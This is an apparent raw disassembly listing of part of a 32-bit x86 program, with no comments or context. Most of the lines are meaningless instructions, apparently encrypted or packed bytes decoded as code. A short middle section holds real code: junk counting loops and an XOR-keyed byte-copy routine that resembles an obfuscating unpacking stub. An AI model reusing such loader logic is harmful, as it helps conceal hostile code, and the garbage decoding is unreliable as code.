  407f8b:	mov    eax,0x6dc15db6
  407f90:	and    al,BYTE PTR [esi+eax*2-0x1b]
  407f94:	add    eax,0xb074daee
  407f99:	adc    al,0xc9
  407f9b:	mov    DWORD PTR [eax-0x7901e8ae],edi
  407fa1:	dec    esp
  407fa2:	aas    
  407fa3:	xlat   BYTE PTR ds:[ebx]
  407fa4:	push   edi
  407fa5:	dec    esi
  407fa6:	jbe    0x40800b
  407fa8:	fwait
  407fa9:	vminpd xmm4,xmm5,xmm2
  407fad:	test   BYTE PTR [esi],al
  407faf:	and    DWORD PTR ds:0xf263390d,0xffffff9f
  407fb6:	cli    
  407fb7:	shr    DWORD PTR [edi],0x4d
  407fba:	loopne 0x407f5c
  407fbc:	and    al,0xb8
  407fbe:	add    al,0x63
  407fc0:	mov    cl,0xad
  407fc2:	add    eax,ebp
  407fc4:	inc    edi
  407fc5:	(bad)  
  407fc7:	icebp  
  407fc8:	mov    ah,0x6
  407fca:	cmp    DWORD PTR [ebx-0x24],edi
  407fcd:	nop
  407fce:	mov    bl,0x17
  407fd0:	leave  
  407fd1:	push   es
  407fd2:	cmp    bh,al
  407fd4:	call   0xef06a7c6
  407fd9:	loopne 0x407fe2
  407fdb:	and    ebp,edi
  407fdd:	jnp    0x40801c
  407fdf:	and    eax,0x41332d4
  407fe4:	gs enter 0x93f8,0xc0
  407fe9:	push   ebx
  407fea:	inc    ecx
  407feb:	dec    ebx
  407fec:	xor    cl,ah
  407fee:	pop    ss
  407fef:	mov    cl,0x1
  407ff1:	or     eax,0x968c18f
  407ff6:	dec    al
  407ff8:	mov    dh,0x68
  407ffa:	jle    0x40805a
  407ffc:	clc    
  407ffd:	xor    edi,DWORD PTR [edx-0x2b]
  408000:	and    DWORD PTR [ecx-0x72],0x59ea5f9b
  408007:	and    al,0x67
  408009:	icebp  
  40800a:	or     al,BYTE PTR [edx]
  40800c:	(bad)  
  40800d:	shl    DWORD PTR [edi+eiz*2-0x39e822bb],cl
  408014:	inc    ebx
  408015:	add    BYTE PTR [ebp+0x54],ah
  408018:	push   cs
  408019:	xlat   BYTE PTR ds:[ebx]
  40801a:	mov    BYTE PTR [eax],bh
  40801c:	mov    ecx,DWORD PTR [edi-0x71f6e134]
  408022:	dec    ebx
  408023:	cmp    eax,0xec7d7054
  408028:	fldenv [esp+eiz*4-0x18]
  40802c:	icebp  
  40802d:	and    eax,0x38e6ade
  408032:	in     eax,dx
  408033:	jbe    0x407fc5
  408035:	bound  eax,QWORD PTR [ebx-0x712a101f]
  40803b:	aam    0x19
  40803d:	rol    DWORD PTR ds:0xc0db9871,0x9b
  408044:	in     eax,dx
  408045:	jns    0x408050
  408047:	mov    BYTE PTR [ecx],0x64
  40804a:	add    al,0x2f
  40804c:	aam    0xc8
  40804e:	add    al,0xd9
  408050:	out    dx,al
  408051:	cs ds ds scas al,BYTE PTR es:[edi]
  408055:	imul   si,WORD PTR [ebx],0x4616
  40805a:	daa    
  40805b:	lods   eax,DWORD PTR ds:[esi]
  40805c:	dec    ebp
  40805d:	sahf   
  40805e:	(bad)  
  40805f:	loopne 0x4080d5
  408061:	nop
  408062:	daa    
  408063:	mov    al,BYTE PTR [esi]
  408065:	aam    0x60
  408067:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408068:	mov    ds:0x1fb3e118,eax
  40806d:	dec    DWORD PTR ds:0x323cb56e
  408073:	test   BYTE PTR ss:[ecx-0x6f981253],dh
  40807a:	(bad)  
  40807b:	sti    
  40807c:	add    edi,DWORD PTR [edx+0x41]
  40807f:	or     al,0x81
  408081:	aad    0x3b
  408083:	inc    edi
  408084:	adc    bh,ch
  408086:	add    al,bh
  408088:	scas   eax,DWORD PTR es:[edi]
  408089:	jno    0x4080d0
  40808b:	not    BYTE PTR [eax]
  40808d:	xchg   edi,eax
  40808e:	pop    ecx
  40808f:	fxch   st(4)
  408091:	ret    
  408092:	popf   
  408093:	and    dh,BYTE PTR [ebp+0x530d2f5e]
  408099:	(bad)  [ebp-0xd]
  40809c:	cli    
  40809d:	dec    esp
  40809e:	jne    0x4080ae
  4080a0:	xlat   BYTE PTR ds:[ebx]
  4080a1:	jmp    0x9dc44a
  4080a6:	pop    es
  4080a7:	jbe    0x408043
  4080a9:	sub    DWORD PTR [edx],esp
  4080ab:	inc    edx
  4080ac:	mov    dl,0x46
  4080af:	inc    edi
  4080b0:	mov    dl,0x97
  4080b2:	imul   ebp,DWORD PTR [ebx-0x59],0x6c
  4080b6:	add    ebx,DWORD PTR [edx+0x3ba9e3aa]
  4080bc:	cdq    
  4080bd:	push   esi
  4080be:	pop    edx
  4080bf:	not    BYTE PTR [ecx+eiz*8]
  4080c2:	jne    0x40805c
  4080c4:	xchg   dl,ah
  4080c6:	gs and al,0xee
  4080c9:	sub    al,0x37
  4080cb:	fwait
  4080cc:	xlat   BYTE PTR ds:[ebx]
  4080cd:	and    ebp,ecx
  4080cf:	add    eax,0x29807812
  4080d4:	emms   
  4080d6:	jge    0x4080bd
  4080d8:	fs rcl dl,1
  4080db:	mov    esi,DWORD PTR ds:0xaa3f6289
  4080e1:	inc    DWORD PTR [edi-0x44f4ae53]
  4080e7:	and    bh,bh
  4080e9:	add    BYTE PTR [ebx],0x6e
  4080ec:	outs   dx,BYTE PTR ds:[esi]
  4080ed:	mov    dh,0x64
  4080ef:	loopne 0x4080b2
  4080f1:	scas   eax,DWORD PTR es:[edi]
  4080f2:	inc    ebp
  4080f3:	in     eax,0x30
  4080f5:	cmp    eax,0xd36ec423
  4080fa:	xchg   edx,eax
  4080fb:	mov    DWORD PTR [ebx],esp
  4080fd:	bound  esi,QWORD PTR [ebp-0x4ea03c5d]
  408103:	or     ebx,edx
  408105:	dec    ecx
  408106:	rol    BYTE PTR [edi],0xbd
  408109:	pop    esi
  40810a:	pop    es
  40810b:	dec    ecx
  40810c:	sar    bh,0x37
  40810f:	sbb    ecx,DWORD PTR [ebx+eiz*4+0x3ee0dcba]
  408116:	lahf   
  408117:	ss in  eax,0x6e
  40811a:	out    0x38,eax
  40811c:	outs   dx,BYTE PTR ds:[esi]
  40811d:	mov    ah,0x6e
  40811f:	test   eax,0x4170235b
  408124:	push   ecx
  408125:	push   ecx
  408126:	or     ah,al
  408128:	ja     0x408166
  40812a:	in     al,0x24
  40812c:	push   ds
  40812d:	icebp  
  40812e:	dec    esp
  40812f:	imul   DWORD PTR [esi-0x456a57ef]
  408135:	xchg   ecx,eax
  408136:	mov    ds:0xd497d625,al
  40813b:	xor    cl,ah
  40813d:	(bad)  
  40813f:	dec    ecx
  408140:	jmp    0x408155
  408142:	push   ebp
  408143:	dec    edi
  408144:	adc    cl,0x8f
  408147:	add    BYTE PTR [ebp+0x20],al
  40814a:	mov    al,0x93
  40814c:	mov    ebx,0x3afb33ab
  408151:	dec    ebx
  408152:	sub    ebp,DWORD PTR [eax]
  408154:	xchg   ecx,eax
  408155:	fstp   TBYTE PTR [eax]
  408157:	(bad)  
  408158:	imul   eax,DWORD PTR [eax],0x50859283
  40815e:	repz mov cl,0x5a
  408161:	nop
  408162:	inc    edx
  408163:	add    eax,0x2c31c97b
  408168:	pop    esp
  408169:	repnz (bad) 
  40816b:	pusha  
  40816c:	jge    0x4081a1
  40816e:	ret    
  40816f:	fcmovb st,st(6)
  408171:	add    DWORD PTR [edi+ebx*2-0x65],ebx
  408175:	pop    ebp
  408176:	xchg   BYTE PTR [ecx],cl
  408178:	stos   BYTE PTR es:[edi],al
  408179:	cld    
  40817a:	out    0xa9,al
  40817c:	jmp    0x3564f655
  408181:	or     ebx,DWORD PTR [edx+0x1b]
  408184:	in     eax,dx
  408185:	and    BYTE PTR [edi],bh
  408187:	hlt    
  408188:	xlat   BYTE PTR ds:[ebx]
  408189:	ins    BYTE PTR es:[edi],dx
  40818a:	mov    edx,0xb38bf236
  40818f:	and    edi,DWORD PTR [edi+0x24664927]
  408195:	inc    eax
  408196:	mov    al,0x40
  408198:	cmp    al,BYTE PTR [ebx]
  40819a:	iret   
  40819b:	dec    ebp
  40819c:	xor    bh,al
  40819e:	push   eax
  40819f:	in     eax,0xe0
  4081a1:	jnp    0x4081ae
  4081a3:	mov    edi,0x7df96aa5
  4081a8:	xchg   edx,eax
  4081a9:	cmc    
  4081aa:	mov    ebx,0xb8d7b9e8
  4081af:	jmp    0x66f64078
  4081b4:	ret    
  4081b5:	inc    ecx
  4081b6:	ret    
  4081b7:	inc    edx
  4081b8:	je     0x4081ea
  4081ba:	js     0x4081ab
  4081bc:	push   esi
  4081bd:	ss xchg ebx,eax
  4081bf:	inc    esi
  4081c0:	stos   BYTE PTR es:[edi],al
  4081c1:	mov    bl,0x37
  4081c3:	cmp    al,0x75
  4081c5:	fst    DWORD PTR [edi+0x2d]
  4081c8:	outs   dx,BYTE PTR ds:[esi]
  4081c9:	lods   al,BYTE PTR ds:[esi]
  4081ca:	mov    ebx,0xbdcfe24e
  4081cf:	cld    
  4081d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081d1:	mov    ch,0x12
  4081d3:	xor    eax,0xe4d60d24
  4081d8:	setno  BYTE PTR [ecx+0x26]
  4081dc:	lea    edi,[edi+ebp*8-0x318b4b5]
  4081e3:	xchg   ecx,eax
  4081e4:	mov    ch,0x54
  4081e6:	cwde   
  4081e7:	jb     0x4081dd
  4081e9:	in     eax,0xac
  4081eb:	mov    ds:0x3e8bd6bc,al
  4081f0:	aad    0x8f
  4081f2:	pop    eax
  4081f3:	xchg   ecx,eax
  4081f4:	jnp    0x408271
  4081f6:	lahf   
  4081f7:	clc    
  4081f8:	std    
  4081f9:	scas   eax,DWORD PTR es:[edi]
  4081fa:	popa   
  4081fb:	jle    0x4081df
  4081fd:	loop   0x408225
  4081ff:	jg     0x408201
  408201:	mov    dh,0xf0
  408203:	mov    eax,0xcc59c669
  408208:	xchg   ebx,eax
  408209:	fimul  DWORD PTR [ecx-0x40b7daac]
  40820f:	pop    edx
  408210:	imul   esi,DWORD PTR [ebp-0x3b4b3ad3],0x2d
  408217:	sbb    BYTE PTR [esi-0x52484028],ch
  40821d:	pop    ebp
  40821e:	adc    DWORD PTR [ebp+0x584e4f09],0x101ae8a
  408228:	ja     0x408296
  40822a:	sub    BYTE PTR [eax-0x21],bh
  40822d:	jb     0x4081dc
  40822f:	mov    DWORD PTR [ecx],esi
  408231:	jmp    DWORD PTR [ebx]
  408233:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408234:	icebp  
  408235:	es inc ebp
  408237:	jp     0x4081c3
  408239:	pop    es
  40823a:	dec    esp
  40823b:	outs   dx,DWORD PTR ds:[esi]
  40823c:	in     eax,dx
  40823d:	mov    DWORD PTR [edi+0x43],edx
  408240:	fucomi st,st(1)
  408242:	xor    ebx,DWORD PTR [ebp+0x59]
  408245:	mov    eax,ds:0xee26e14b
  40824a:	xchg   ecx,eax
  40824b:	jmp    0xea19:0x84acfd5b
  408252:	shl    DWORD PTR [eax-0x65],0xf5
  408256:	push   es
  408257:	int    0xfa
  408259:	int3   
  40825a:	fwait
  40825b:	lock pop ebp
  40825d:	dec    ecx
  40825e:	scas   al,BYTE PTR es:[edi]
  40825f:	push   edx
  408260:	cmp    eax,0x46f74c9d
  408265:	out    dx,eax
  408266:	fwait
  408267:	out    0x7e,al
  408269:	fdiv   st(7),st
  40826b:	gs cmc 
  40826d:	repz xor dh,BYTE PTR [eax-0x46]
  408271:	jb     0x40822e
  408273:	repz repz arpl WORD PTR [edx],si
  408277:	adc    esi,DWORD PTR [ebp-0x2daf8d5a]
  40827d:	and    ch,BYTE PTR [ebp+edx*1-0x172da88e]
  408284:	sbb    al,0xf3
  408286:	retf   
  408287:	mov    bl,bl
  408289:	sbb    al,BYTE PTR [edx]
  40828b:	xchg   edi,eax
  40828c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40828d:	inc    esp
  40828e:	push   ebx
  40828f:	cwde   
  408290:	push   edi
  408291:	push   eax
  408292:	pop    ds
  408293:	mov    dh,0xa
  408295:	retf   0xf4b4
  408298:	push   edx
  408299:	or     edi,edx
  40829b:	or     ebx,DWORD PTR [ebx-0x7012218d]
  4082a1:	pop    esp
  4082a2:	mov    ch,0xf0
  4082a4:	adc    esp,DWORD PTR [ecx]
  4082a6:	mov    ds:0xfa801845,eax
  4082ab:	(bad)  
  4082ac:	add    eax,DWORD PTR [ebp-0x40]
  4082af:	pop    ebp
  4082b0:	dec    edi
  4082b1:	dec    edx
  4082b2:	or     DWORD PTR [eax+ecx*8+0x2633a740],0xffffffaa
  4082ba:	push   edi
  4082bb:	mov    bh,0xa4
  4082bd:	cdq    
  4082be:	ins    BYTE PTR es:[edi],dx
  4082bf:	mov    eax,0x6029c7a1
  4082c4:	mov    BYTE PTR [eax-0x4c49d8af],dl
  4082ca:	sahf   
  4082cb:	push   esi
  4082cc:	hlt    
  4082cd:	adc    BYTE PTR [esi-0x68],bh
  4082d0:	push   0x33cd912
  4082d5:	inc    ebp
  4082d6:	gs dec esi
  4082d8:	mov    WORD PTR [ecx],es
  4082da:	jnp    0x40832b
  4082dc:	inc    edi
  4082dd:	pop    es
  4082de:	in     eax,0xda
  4082e0:	in     al,dx
  4082e1:	test   al,0x83
  4082e3:	fwait
  4082e4:	push   ebp
  4082e5:	jns    0x408268
  4082e7:	xor    cl,0xf0
  4082ea:	pop    ecx
  4082eb:	(bad)  
  4082ec:	or     al,0xf0
  4082ee:	mov    dh,0x6d
  4082f0:	or     bl,ch
  4082f2:	or     edi,DWORD PTR [ebx]
  4082f4:	aad    0x8
  4082f6:	das    
  4082f7:	mov    al,0xf
  4082f9:	dec    ebx
  4082fa:	retf   0x3d53
  4082fd:	jmp    0xd329:0xf9ebc0ce
  408304:	mov    ds:0xf8185ddd,eax
  408309:	test   dl,ah
  40830b:	dec    esi
  40830c:	scas   eax,DWORD PTR es:[edi]
  40830d:	push   ecx
  40830e:	xor    BYTE PTR [eax-0x7e4bec8b],0x96
  408315:	jb     0x4082ef
  408317:	mov    ch,0x3b
  408319:	dec    ecx
  40831a:	xor    BYTE PTR [edx+edi*4-0x62],dh
  40831e:	les    edx,FWORD PTR [edi-0x9]
  408321:	push   0xffffffa0
  408323:	cmp    al,0x76
  408325:	mov    ch,0xc7
  408327:	and    eax,0x1230f6d4
  40832c:	mov    edi,ss
  40832e:	pop    edi
  40832f:	(bad)  
  408330:	enter  0x1b6f,0xa9
  408334:	in     eax,dx
  408335:	adc    DWORD PTR [edi-0x1e51ed2d],esi
  40833b:	sub    DWORD PTR gs:[esi-0x60c37402],0xe916a97
  408346:	push   edx
  408347:	inc    esi
  408348:	and    DWORD PTR [ebx-0x32],esp
  40834b:	jg     0x408373
  40834d:	shr    BYTE PTR [edx+0x4e],1
  408350:	cmp    BYTE PTR [esi+0x46],ch
  408353:	and    DWORD PTR [ecx-0x5e],ecx
  408356:	add    ch,BYTE PTR [ebp+0x6402662]
  40835c:	js     0x40838b
  40835e:	mov    dl,BYTE PTR [edx]
  408360:	add    BYTE PTR [eax-0x206a6726],dh
  408366:	adc    esp,DWORD PTR [esi+edi*1]
  408369:	sbb    ebx,DWORD PTR [ebp-0x23]
  40836c:	aas    
  40836d:	stos   BYTE PTR es:[edi],al
  40836e:	leave  
  40836f:	sub    al,0x82
  408371:	and    dh,ah
  408373:	sahf   
  408374:	inc    eax
  408375:	mov    ah,0x48
  408377:	shl    BYTE PTR fs:[esi-0x389974a3],0x0
  40837f:	xchg   esi,eax
  408380:	in     eax,0x27
  408382:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408383:	push   edx
  408384:	(bad)  
  408385:	mov    edi,0xd8f90e23
  40838a:	into   
  40838b:	xchg   edi,eax
  40838c:	cs ins BYTE PTR es:[edi],dx
  40838e:	ja     0x408358
  408390:	arpl   di,cx
  408392:	fisubr WORD PTR [ecx-0x49]
  408395:	xchg   ecx,eax
  408396:	mov    dl,0x6d
  408398:	mov    bl,0x92
  40839a:	push   ss
  40839b:	arpl   WORD PTR [eax+0x363edca7],sp
  4083a1:	iret   
  4083a2:	cdq    
  4083a3:	aaa    
  4083a4:	xor    edi,DWORD PTR [edx-0x35]
  4083a7:	pop    edi
  4083a8:	lahf   
  4083a9:	push   edx
  4083aa:	mov    ecx,0x5793adcf
  4083af:	dec    edi
  4083b0:	mov    ebp,0x7e47d43a
  4083b5:	or     al,0x44
  4083b7:	mov    bl,0xd0
  4083b9:	iret   
  4083ba:	add    eax,0x5a67eb4e
  4083bf:	xchg   ebx,eax
  4083c0:	adc    eax,0xb74e050
  4083c5:	and    al,0x65
  4083c7:	cli    
  4083c8:	xchg   edx,ebp
  4083ca:	cmp    ebx,DWORD PTR [ebp-0x2e]
  4083cd:	dec    eax
  4083ce:	arpl   WORD PTR [edi+0x1ea55d3d],bp
  4083d4:	mov    al,0xe7
  4083d6:	stos   BYTE PTR es:[edi],al
  4083d7:	xchg   BYTE PTR [edx+edx*4+0x37f2366],bh
  4083de:	ret    0xbad7
  4083e1:	stos   DWORD PTR es:[edi],eax
  4083e2:	jae    0x4083ea
  4083e4:	ret    
  4083e5:	pop    ss
  4083e6:	not    DWORD PTR [eax+0x48976163]
  4083ec:	or     ebp,DWORD PTR [eax]
  4083ee:	jbe    0x408438
  4083f0:	xchg   esi,eax
  4083f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083f2:	pop    edx
  4083f3:	mov    dh,0x7e
  4083f5:	xchg   esi,eax
  4083f6:	xchg   edx,eax
  4083f7:	test   al,0x75
  4083f9:	cld    
  4083fa:	xchg   BYTE PTR [eax+0x3e],bl
  4083fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083fe:	aaa    
  4083ff:	lock fisubr DWORD PTR cs:[ebp+0x42]
  408404:	stos   DWORD PTR es:[edi],eax
  408405:	pop    esp
  408406:	setno  BYTE PTR [esi+0x3bd08931]
  40840d:	pop    esi
  40840e:	pop    ebx
  40840f:	leave  
  408410:	ret    0xc
  408413:	push   ebp
  408414:	mov    ebp,esp
  408416:	mov    DWORD PTR ds:0x42415e,0xf89c85b5
  408420:	mov    DWORD PTR ds:0x42a00c,0x7dd6
  40842a:	pop    ebp
  40842b:	jmp    0x41b7a1
  408430:	xor    eax,eax
  408432:	or     DWORD PTR ds:0x42b010,0x429008
  40843c:	inc    eax
  40843d:	ret    
  40843e:	push   ebp
  40843f:	mov    ebp,esp
  408441:	sub    esp,0x10
  408444:	sbb    ecx,DWORD PTR ds:0x42d008
  40844a:	mov    eax,0xf89c85b6
  40844f:	mov    edx,DWORD PTR ds:0x42b000
  408455:	add    DWORD PTR ds:0x42c018,edx
  40845b:	mov    DWORD PTR [ebp-0x4],eax
  40845e:	dec    edx
  40845f:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  408466:	mov    DWORD PTR ds:0x42b01c,0x18
  408470:	cmp    DWORD PTR ds:0x42b01c,0x0
  408477:	je     0x4084ad
  40847d:	cmp    DWORD PTR ds:0x42b01c,0x1b
  408484:	jne    0x40849b
  40848a:	push   DWORD PTR [ebp-0x28]
  40848d:	push   0x7565
  408492:	push   DWORD PTR [ebp-0x18]
  408495:	call   DWORD PTR ds:0x425040
  40849b:	mov    edx,DWORD PTR ds:0x42b01c
  4084a1:	dec    edx
  4084a2:	mov    DWORD PTR ds:0x42b01c,edx
  4084a8:	jmp    0x408470
  4084ad:	mov    ecx,DWORD PTR [ebp-0x4]
  4084b0:	xor    edx,DWORD PTR ds:0x42b008
  4084b6:	push   esi
  4084b7:	mov    DWORD PTR ds:0x42c000,0x17
  4084c1:	cmp    DWORD PTR ds:0x42c000,0x0
  4084c8:	je     0x408518
  4084ce:	cmp    DWORD PTR ds:0x42c000,0xa
  4084d5:	jne    0x4084ec
  4084db:	push   0x8fa2
  4084e0:	push   DWORD PTR [ebp-0x24]
  4084e3:	push   DWORD PTR [ebp-0xc]
  4084e6:	call   DWORD PTR ds:0x425044
  4084ec:	cmp    DWORD PTR ds:0x42c000,0xb
  4084f3:	jne    0x408506
  4084f9:	mov    edx,DWORD PTR ds:0x42c000
  4084ff:	dec    edx
  408500:	mov    DWORD PTR ds:0x42c000,edx
  408506:	mov    edx,DWORD PTR ds:0x42c000
  40850c:	dec    edx
  40850d:	mov    DWORD PTR ds:0x42c000,edx
  408513:	jmp    0x4084c1
  408518:	mov    edx,0x7510893
  40851d:	xor    ecx,edx
  40851f:	and    DWORD PTR ds:0x429018,0x2759
  408529:	mov    esi,0x3272db
  40852e:	mov    DWORD PTR ds:0x42b01c,0x64d9
  408538:	push   edi
  408539:	mov    DWORD PTR ds:0x42c000,0x1c
  408543:	cmp    DWORD PTR ds:0x42c000,0x0
  40854a:	je     0x4085a2
  408550:	cmp    DWORD PTR ds:0x42c000,0xb
  408557:	jne    0x408573
  40855d:	push   DWORD PTR [ebp-0xc]
  408560:	push   DWORD PTR [ebp-0x10]
  408563:	push   0x6908
  408568:	push   0x2a1a
  40856d:	call   DWORD PTR ds:0x425048
  408573:	cmp    DWORD PTR ds:0x42c000,0xc
  40857a:	jne    0x40858f
  408580:	xor    edi,edi
  408582:	xor    edi,DWORD PTR ds:0x42c000
  408588:	dec    edi
  408589:	mov    DWORD PTR ds:0x42c000,edi
  40858f:	mov    edi,DWORD PTR ds:0x42c000
  408595:	dec    edi
  408596:	mov    DWORD PTR ds:0x42c000,edi
  40859c:	jmp    0x408543
  4085a1:	dec    edi
  4085a2:	mov    edi,DWORD PTR [ebp+0x10]
  4085a5:	xor    DWORD PTR ds:0x429004,0x6210
  4085af:	add    ecx,esi
  4085b1:	cmp    ecx,edi
  4085b3:	je     0x408678
  4085b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4085bc:	mov    edi,DWORD PTR [ebp+0x10]
  4085bf:	xor    eax,eax
  4085c1:	xor    ecx,edx
  4085c3:	add    ecx,esi
  4085c5:	add    edi,0xfabdbef1
  4085cb:	adc    eax,0xffffffff
  4085ce:	xor    eax,0x0
  4085d1:	mov    DWORD PTR [ebp-0xc],eax
  4085d4:	push   ebx
  4085d5:	xor    ebx,ebx
  4085d7:	xor    edi,0x8a29a123
  4085dd:	mov    eax,ecx
  4085df:	add    eax,0xfabdbef1
  4085e4:	adc    ebx,0xffffffff
  4085e7:	xor    eax,0x8a29a123
  4085ec:	xor    ebx,0x0
  4085ef:	cmp    eax,edi
  4085f1:	jne    0x40860a
  4085f7:	cmp    ebx,DWORD PTR [ebp-0xc]
  4085fa:	je     0x408672
  408600:	jmp    0x40860a
  408605:	mov    esi,0x3272db
  40860a:	mov    eax,DWORD PTR [ebp-0x4]
  40860d:	mov    edi,DWORD PTR [ebp-0x8]
  408610:	xor    edi,edx
  408612:	add    edi,esi
  408614:	mov    esi,DWORD PTR [ebp+0x8]
  408617:	imul   edi,ecx
  40861a:	mov    ebx,DWORD PTR [ebp+0xc]
  40861d:	xor    eax,edx
  40861f:	add    eax,ecx
  408621:	mov    al,BYTE PTR [ebx+eax*1+0x3272db]
  408628:	mov    BYTE PTR [edi+esi*1],al
  40862b:	mov    eax,DWORD PTR [ebp-0x8]
  40862e:	mov    esi,DWORD PTR [ebp+0x10]
  408631:	xor    eax,edx
  408633:	xor    ebx,ebx
  408635:	add    esi,0xfabdbef1
  40863b:	adc    ebx,0xffffffff
  40863e:	lea    ecx,[ecx+eax*1+0x3272db]
  408645:	xor    edi,edi
  408647:	xor    esi,0x8a29a123
  40864d:	xor    ebx,0x0
  408650:	mov    eax,ecx
  408652:	add    eax,0xfabdbef1
  408657:	adc    edi,0xffffffff
  40865a:	xor    eax,0x8a29a123
  40865f:	xor    edi,0x0
  408662:	cmp    eax,esi
  408664:	jne    0x408605
  40866a:	cmp    edi,ebx
  40866c:	jne    0x408605
  408672:	mov    eax,0xf89c85b5
  408677:	pop    ebx
  408678:	pop    edi
  408679:	pop    esi
  40867a:	leave  
  40867b:	ret    0xc
  40867e:	push   ebp
  40867f:	mov    ebp,esp
  408681:	sub    esp,0x78
  408684:	adc    DWORD PTR ds:0x429000,0x42d00c
  40868e:	push   ebx
  40868f:	or     DWORD PTR ds:0x42d000,0x5016
  408699:	push   esi
  40869a:	sbb    DWORD PTR ds:0x42d008,0x6d64
  4086a4:	push   edi
  4086a5:	push   0x1f
  4086a7:	and    DWORD PTR ds:0x42d018,0x1f4a
  4086b1:	lea    eax,[ebp-0x78]
  4086b4:	push   eax
  4086b5:	not    DWORD PTR ds:0x42c008
  4086bb:	push   0x0
  4086bd:	xor    DWORD PTR ds:0x429008,0x2961
  4086c7:	jmp    0x40aa2c
  4086cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086cd:	xchg   esi,eax
  4086ce:	sub    edx,ebp
  4086d0:	out    0x65,eax
  4086d2:	arpl   WORD PTR [ebx+eiz*8+0x331a558d],dx
  4086d9:	arpl   WORD PTR [esp+ebp*2],bp
  4086dc:	push   eax
  4086dd:	sbb    BYTE PTR [edx+0x62],ah
  4086e0:	cmp    bl,BYTE PTR [edi+0x62]
  4086e3:	bound  edi,QWORD PTR [ebp+0x2586f62f]
  4086e9:	mov    al,ds:0x7f1c4326
  4086ee:	out    0xe0,al
  4086f0:	or     BYTE PTR [edi+0x289dec8e],bh
  4086f6:	loope  0x40874a
  4086f8:	adc    bl,BYTE PTR [ecx]
  4086fa:	repnz and ebx,ecx
  4086fd:	jns    0x408735
  4086ff:	cmp    DWORD PTR [ebp+0x2876e423],ebp
  408705:	push   ebx
  408706:	addr16 mov ds:0x688e,eax
  40870a:	push   ebx
  40870b:	test   al,0x51
  40870d:	add    esp,DWORD PTR [ebp+0x77]
  408710:	and    esi,edi
  408712:	sub    al,0xc7
  408714:	pop    edx
  408715:	jne    0x4086b0
  408717:	aaa    
  408718:	pop    ebx
  408719:	fstp   DWORD PTR [edx-0x66]
  40871c:	push   cs
  40871d:	retf   0xc15e
  408720:	ss add dh,BYTE PTR gs:[ebp+0x50a7c02b]
  408728:	or     DWORD PTR [ebx-0x7659e36f],0x1
  40872f:	outs   dx,BYTE PTR ds:[esi]
  408730:	gs pop eax
  408732:	push   ebx
  408733:	or     ebx,DWORD PTR [esi+edx*4]
  408736:	sub    al,0x38
  408738:	xor    dl,ah
  40873a:	xchg   ecx,eax
  40873b:	loop   0x4086e6
  40873d:	push   ds
  40873e:	out    dx,al
  40873f:	inc    edx
  408740:	jno    0x4087a3
  408742:	retf   0x63a0
  408745:	fwait
  408746:	rol    dh,0x5c
  408749:	addr16 nop
  40874b:	mov    BYTE PTR [ecx-0x2e],dl
  40874e:	lock mov bl,0x67
  408751:	jne    0x408747
  408753:	int3   
  408754:	in     al,0xb7
  408756:	in     eax,dx
  408757:	push   esi
  408758:	ror    BYTE PTR [edi],0x6
  40875b:	add    dl,BYTE PTR [esi+0x28]
  40875e:	out    dx,al
  40875f:	scas   eax,DWORD PTR es:[edi]
  408760:	stos   BYTE PTR es:[edi],al
  408761:	pusha  
  408762:	imul   esi,DWORD PTR [eax],0xe0e3f553
  408768:	nop
  408769:	xor    al,0xfb
  40876b:	sahf   
  40876c:	xchg   esi,eax
  40876d:	fsub   QWORD PTR ds:0x9f050376
  408773:	pop    edx
  408774:	in     eax,0xbf
  408776:	dec    esi
  408777:	pop    eax
  408778:	pop    eax
  408779:	mov    dh,0x0
  40877b:	push   ebp
  40877c:	fsubr  DWORD PTR [edi+0x63]
  40877f:	and    ch,BYTE PTR [ecx]
  408781:	pusha  
  408782:	sahf   
  408783:	cld    
  408784:	pusha  
  408785:	or     al,0x13
  408787:	std    
  408788:	add    eax,0xebf244d6
  40878d:	sub    BYTE PTR [esi+0x49c5c1c7],0x33
  408794:	push   es
  408795:	push   ss
  408796:	test   ebx,ebx
  408798:	adc    DWORD PTR [ebx-0x1],ebx
  40879b:	push   edx
  40879c:	in     al,0x8a
  40879e:	test   ebp,esi
  4087a0:	jbe    0x408789
  4087a2:	dec    eax
  4087a3:	sbb    edx,esp
  4087a5:	inc    edi
  4087a6:	in     eax,dx
  4087a7:	pop    ss
  4087a8:	push   ebp
  4087a9:	stos   BYTE PTR es:[edi],al
  4087aa:	dec    edi
  4087ab:	add    BYTE PTR [esi+edi*8-0x46],bl
  4087af:	mov    dh,0xa8
  4087b1:	cld    
  4087b2:	xchg   BYTE PTR [ebx],cl
  4087b4:	jo     0x40879b
  4087b6:	aaa    
  4087b7:	stos   DWORD PTR es:[edi],eax
  4087b8:	loop   0x40877e
  4087ba:	and    ecx,ebp
  4087bc:	cmp    eax,0xd3924b0f
  4087c1:	lock xchg esi,eax
  4087c3:	mov    edi,0xac2a6492
  4087c8:	out    0x39,eax
  4087ca:	cs stos DWORD PTR es:[edi],eax
  4087cc:	cmp    BYTE PTR [ebp+0x5a009e50],dl
  4087d2:	pusha  
  4087d3:	sub    eax,0x9b4f3ed4
  4087d8:	and    al,0x9
  4087da:	jno    0x408814
  4087dc:	aad    0xf0
  4087de:	int3   
  4087df:	out    0x73,eax
  4087e1:	dec    edi
  4087e2:	add    BYTE PTR [edi+0x6c],cl
  4087e5:	add    BYTE PTR [edx],bh
  4087e7:	retf   0xf9ff
  4087ea:	cmp    esi,DWORD PTR [ebx]
  4087ec:	and    al,0x57
  4087ee:	inc    ebp
  4087ef:	int3   
  4087f0:	inc    ebx
  4087f1:	pop    ebx
  4087f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087f3:	loope  0x4087f8
  4087f5:	test   eax,0xe7878127
  4087fa:	ja     0x4087b8
  4087fc:	repz or BYTE PTR [edx-0xf],al
  408800:	fldcw  WORD PTR [ebx]
  408802:	inc    edx
  408803:	jecxz  0x40882d
  408805:	fstp   QWORD PTR [edi]
  408807:	push   es
  408808:	ret    0x2453
  40880b:	fwait
